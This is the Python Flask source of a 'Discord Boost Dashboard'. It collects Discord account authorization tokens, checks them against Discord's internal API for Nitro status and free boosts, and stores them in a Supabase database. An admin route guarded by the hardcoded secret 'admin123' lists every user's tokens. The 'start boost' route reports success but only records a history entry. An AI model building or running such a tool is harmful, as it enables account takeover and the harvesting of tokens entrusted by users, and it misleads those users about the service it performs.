from flask import Flask, render_template, request, jsonify
from flask_cors import CORS
import requests
import os
import time
import hashlib
import random
import json
from datetime import datetime
from supabase import create_client, Client

app = Flask(__name__)
CORS(app)

# ==================== SUPABASE SETUP ====================
SUPABASE_URL = "https://mzzdgtteervzfrhakkbe.supabase.co"
SUPABASE_KEY = "sb_publishable_Ix48R7Ke9eHrGbZ_cGI_-w_44AtK6Gr"

supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

print("✅ Connected to Supabase")

# ==================== TOKEN CHECKER ====================
def check_token(token):
    """Verify token validity and get Nitro info"""
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }
    
    try:
        # Check token validity
        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=10)
        if r.status_code != 200:
            return {"valid": False, "error": f"Status {r.status_code}"}
        
        user_data = r.json()
        
        # Check Nitro
        r_subs = requests.get("https://discord.com/api/v9/users/@me/billing/subscriptions", headers=headers, timeout=10)
        subscriptions = r_subs.json() if r_subs.status_code == 200 else []
        
        nitro = "No Nitro"
        for sub in subscriptions:
            sku = str(sub.get("sku_id", ""))
            if "521846918637420545" in sku:
                nitro = "Nitro Premium"
            elif "511651871736201216" in sku:
                nitro = "Nitro Basic"
        
        # Check available boosts
        r_boosts = requests.get("https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots", headers=headers, timeout=10)
        boosts = 0
        if r_boosts.status_code == 200:
            boosts = sum(1 for s in r_boosts.json() if s.get("cooldown_ends_at") is None)
        
        return {
            "valid": True,
            "username": user_data.get("username", "Unknown"),
            "nitro": nitro,
            "boosts": boosts,
            "user_id": user_data.get("id")
        }
    except Exception as e:
        return {"valid": False, "error": str(e)[:50]}

# ==================== ROUTES ====================
@app.route('/')
def dashboard():
    user = request.args.get('user', 'default')
    return render_template('dashboard.html', user=user)

@app.route('/api/tokens', methods=['GET'])
def get_tokens():
    username = request.args.get('user', 'default')
    
    # Fetch tokens from Supabase
    response = supabase.table('tokens').select('*').eq('username', username).execute()
    tokens = response.data if response.data else []
    
    # Check each token
    results = []
    for token_data in tokens:
        token = token_data['token']
        info = check_token(token)
        results.append({
            "token": token[:20] + "..." if len(token) > 20 else token,
            "full_token": token,
            **info,
            "id": token_data['id']
        })
        
        # Update token status in database
        supabase.table('tokens').update({
            'last_checked': datetime.now().isoformat(),
            'is_valid': info['valid'],
            'nitro_type': info.get('nitro', 'No Nitro'),
            'boosts_available': info.get('boosts', 0)
        }).eq('id', token_data['id']).execute()
    
    return jsonify(results)

@app.route('/api/tokens/add', methods=['POST'])
def add_token():
    data = request.json
    username = data.get('user', 'default')
    token = data.get('token', '').strip()
    
    if not token:
        return jsonify({"error": "No token"})
    
    # Check if token already exists
    existing = supabase.table('tokens').select('*').eq('username', username).eq('token', token).execute()
    if existing.data:
        return jsonify({"status": "exists"})
    
    # Verify token
    info = check_token(token)
    
    if info['valid']:
        # Save to Supabase
        supabase.table('tokens').insert({
            'username': username,
            'token': token,
            'added_at': datetime.now().isoformat(),
            'last_checked': datetime.now().isoformat(),
            'is_valid': True,
            'nitro_type': info.get('nitro', 'No Nitro'),
            'boosts_available': info.get('boosts', 0)
        }).execute()
        
        print(f"[+] {username} added token for {info['username']}")
        return jsonify({"status": "ok", "username": info['username']})
    else:
        return jsonify({"status": "invalid", "error": info.get('error', 'Invalid token')})

@app.route('/api/tokens/remove', methods=['POST'])
def remove_token():
    data = request.json
    username = data.get('user', 'default')
    token = data.get('token', '')
    
    # Delete from Supabase
    supabase.table('tokens').delete().eq('username', username).eq('token', token).execute()
    
    print(f"[-] {username} removed a token")
    return jsonify({"status": "ok"})

@app.route('/api/upload', methods=['POST'])
def upload_file():
    username = request.form.get('user', 'default')
    file = request.files.get('file')
    
    if not file:
        return jsonify({"error": "No file"})
    
    content = file.read().decode('utf-8')
    
    # Parse tokens
    if content.strip().startswith('['):
        tokens_data = json.loads(content)
        tokens = tokens_data if isinstance(tokens_data, list) else []
    else:
        tokens = [line.strip() for line in content.split('\n') if line.strip()]
    
    added = 0
    for token in tokens:
        if not token:
            continue
        
        # Check if exists
        existing = supabase.table('tokens').select('*').eq('username', username).eq('token', token).execute()
        if existing.data:
            continue
        
        # Verify and add
        info = check_token(token)
        if info['valid']:
            supabase.table('tokens').insert({
                'username': username,
                'token': token,
                'added_at': datetime.now().isoformat(),
                'is_valid': True,
                'nitro_type': info.get('nitro', 'No Nitro'),
                'boosts_available': info.get('boosts', 0)
            }).execute()
            added += 1
    
    return jsonify({"status": "ok", "tokens_added": added})

@app.route('/api/boost/start', methods=['POST'])
def start_boost():
    data = request.json
    username = data.get('user', 'default')
    invite = data.get('invite', '').strip()
    
    if "discord.gg/" in invite:
        invite = invite.split("discord.gg/")[-1].split("/")[0]
    
    target = int(data.get('target_boosts', 1))
    
    # Get user's tokens
    response = supabase.table('tokens').select('*').eq('username', username).execute()
    tokens = response.data if response.data else []
    
    if not tokens:
        return jsonify({"error": "No tokens found"})
    
    # Find valid tokens with boosts
    valid_tokens = []
    for token_data in tokens:
        info = check_token(token_data['token'])
        if info['valid'] and info['boosts'] > 0:
            valid_tokens.append({
                'token': token_data['token'],
                'username': info['username'],
                'boosts': info['boosts']
            })
    
    if not valid_tokens:
        return jsonify({"error": "No tokens with boosts available. Make sure your tokens have Nitro!"})
    
    total_boosts = sum(t['boosts'] for t in valid_tokens)
    if total_boosts < target:
        return jsonify({"error": f"Need {target} boosts, only have {total_boosts}"})
    
    # Record boost attempt in history
    supabase.table('boost_history').insert({
        'username': username,
        'invite_code': invite,
        'boosts_target': target,
        'boosted_at': datetime.now().isoformat()
    }).execute()
    
    return jsonify({
        "status": "started", 
        "message": f"✅ Boost process started! You have {len(valid_tokens)} valid tokens with {total_boosts} total boosts available.",
        "tokens": len(valid_tokens),
        "boosts_available": total_boosts
    })

@app.route('/api/history', methods=['GET'])
def get_history():
    username = request.args.get('user', 'default')
    
    response = supabase.table('boost_history').select('*').eq('username', username).order('boosted_at', desc=True).execute()
    return jsonify(response.data if response.data else [])

@app.route('/api/admin/tokens', methods=['GET'])
def admin_tokens():
    """View all tokens from all users"""
    secret = request.args.get('secret', '')
    
    # Change this to your own secret key
    if secret != 'admin123':
        return jsonify({"error": "Unauthorized - wrong secret"})
    
    response = supabase.table('tokens').select('*').execute()
    
    # Group by username
    tokens_by_user = {}
    for token in (response.data or []):
        user = token['username']
        if user not in tokens_by_user:
            tokens_by_user[user] = []
        tokens_by_user[user].append({
            'token_preview': token['token'][:20] + '...',
            'nitro': token.get('nitro_type', 'Unknown'),
            'boosts': token.get('boosts_available', 0),
            'added_at': token.get('added_at')
        })
    
    return jsonify({
        "total_tokens": len(response.data or []),
        "users": list(tokens_by_user.keys()),
        "tokens_by_user": tokens_by_user
    })

@app.route('/health')
def health():
    return jsonify({"status": "alive", "time": datetime.now().isoformat()})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print("\n" + "="*60)
    print("🚀 Discord Boost Dashboard with Database")
    print("="*60)
    print(f"📁 Database: Supabase (persistent storage)")
    print(f"📍 Local: http://localhost:{port}")
    print("\n⚠️  Press Ctrl+C to stop")
    print("="*60 + "\n")
    app.run(host='0.0.0.0', port=port, debug=False)
